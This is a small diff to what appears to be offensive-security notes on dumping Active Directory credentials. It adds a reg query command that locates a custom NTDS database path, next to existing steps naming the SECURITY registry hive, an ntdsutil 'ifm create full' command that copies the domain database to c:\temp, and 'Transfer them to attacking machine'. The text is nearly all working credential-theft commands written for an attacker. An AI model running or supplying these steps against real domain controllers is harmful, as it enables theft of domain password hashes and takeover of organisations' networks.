@@ -8,6 +8,8 @@
 
 ### 3) C:\windows\system32\config\SECURITY
 
+## Locating the ntds custom location: reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
+
 #### 1) powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 
 #### 2) Transfer them to attacking machine
